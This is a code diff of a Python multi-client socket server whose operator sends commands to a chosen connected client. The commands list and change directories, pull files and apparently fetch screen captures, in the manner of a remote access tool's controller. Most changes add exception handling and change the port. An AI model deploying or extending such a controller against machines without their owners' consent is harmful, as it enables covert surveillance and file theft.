@@ -5,7 +5,6 @@ import glob
 from threading import Thread
 import threading
 
-#Threads=[]
 
 Threads_dict={}
 block_thread = threading.Condition()
@@ -16,10 +15,9 @@ def main():
 def start_server():
     host = socket.gethostname()
     #host = '127.0.0.1'
-    port = 1337         # arbitrary non-privileged port
+    port = 13337         # arbitrary non-privileged port
 
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)   # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire
     print("Socket created")
 
     try:
@@ -35,28 +33,26 @@ def start_server():
         with block_thread:
             command = input('enter a command: ')
             print(Threads_dict)
+            print(threading.active_count())
             ip = input('which client?')
             if ip in Threads_dict:
                 Threads_dict[ip] = command
                 block_thread.wait()
-        
     soc.close()
 
 
 def listening_thread(soc, max_query):
     soc.listen(max_query)       # queue up to 5 requests
     print("Socket now listening\n")
-    
-
      # infinite loop- do not reset for every requests
     while True:
         connection, address = soc.accept()
         ip, port = str(address[0]), str(address[1])
         print("Connected with " + ip + ":" + port)
-
         try:
             Threads_dict.update({ip:''})
             Thread(target=client_thread, args=(connection, ip, port), name=ip).start()
+            
         except:
             print("Thread did not start.")
             traceback.print_exc()
@@ -67,49 +63,51 @@ def client_thread(connection, ip, port, max_buffer_size = 5120):
    
     while is_active:
         if(Threads_dict.get(ip) != ''):
+            try:
             #client_input = receive_input(connection, max_buffer_size)
-            client_input = Threads_dict.get(ip)
-            print('command:' + client_input + ' for ' + ip)
-            if "--quit--" in client_input:
-                print("Client is requesting to quit")
-                connection.close()
-                print("Connection " + ip + ":" + port + " closed")
-                is_active = False
-            elif("push" in client_input):
-                connection.sendall('ls'.encode('utf-8'))
-                Threads_dict.update({ip:''})
-                print(connection.recv(1024).decode('utf-8'))
-            elif("scr" in client_input):
-                with block_thread:
-                    connection.sendall('scr'.encode('utf-8'))
-                    fname = connection.recv(1024).decode('utf-8')
-                    load_scr(fname, connection)
-                    block_thread.notify_all()
-            elif("ls" in client_input):
-                #здесь надо стопать главный тред а то уебищный вывод
-                with block_thread:
+                client_input = Threads_dict.get(ip)
+                print('command:' + client_input + ' for ' + ip)
+                if "--quit--" in client_input:
+                    print("Client is requesting to quit")
+                    connection.close()
+                    print("Connection " + ip + ":" + port + " closed")
+                    is_active = False
+                elif("push" in client_input):
                     connection.sendall('ls'.encode('utf-8'))
                     Threads_dict.update({ip:''})
                     print(connection.recv(1024).decode('utf-8'))
-                    block_thread.notify_all()
-            elif("cd" in client_input):
-                with block_thread:
-                    connection.sendall('cd'.encode('utf-8'))
-                    dire = input('Enter dir: ')
-                    connection.sendall(dire.encode('utf-8'))
-                    Threads_dict.update({ip:''})
-                    print(connection.recv(1024).decode('utf-8'))
-                    block_thread.notify_all()
-            elif("pull" in client_input):
-                with block_thread:
-                    connection.sendall('pull'.encode('utf-8'))
-                    file_name = input('enter filename: ')
-                    connection.sendall(file_name.encode('utf-8'))
-                    load_file(file_name ,connection)
-                    Threads_dict.update({ip:''})
-                    block_thread.notify_all()
-                    #is_active = False
-            
+                elif("scr" in client_input):
+                    with block_thread:
+                        connection.sendall('scr'.encode('utf-8'))
+                        fname = connection.recv(1024).decode('utf-8')
+                        load_scr(fname, connection)
+                        block_thread.notify_all()
+                elif("ls" in client_input):
+                    #здесь надо стопать главный тред а то уебищный вывод
+                    with block_thread:
+                        connection.sendall('ls'.encode('utf-8'))
+                        Threads_dict.update({ip:''})
+                        print(connection.recv(1024).decode('utf-8'))
+                        block_thread.notify_all()
+                elif("cd" in client_input):
+                    with block_thread:
+                        connection.sendall('cd'.encode('utf-8'))
+                        dire = input('Enter dir: ')
+                        connection.sendall(dire.encode('utf-8'))
+                        Threads_dict.update({ip:''})
+                        print(connection.recv(1024).decode('utf-8'))
+                        block_thread.notify_all()
+                elif("pull" in client_input):
+                    with block_thread:
+                        connection.sendall('pull'.encode('utf-8'))
+                        file_name = input('enter filename: ')
+                        connection.sendall(file_name.encode('utf-8'))
+                        load_file(file_name ,connection)
+                        Threads_dict.update({ip:''})
+                        block_thread.notify_all()
+                        #is_active = False
+            except:
+                is_active = False            
 
 
 def load_scr(fn,c):
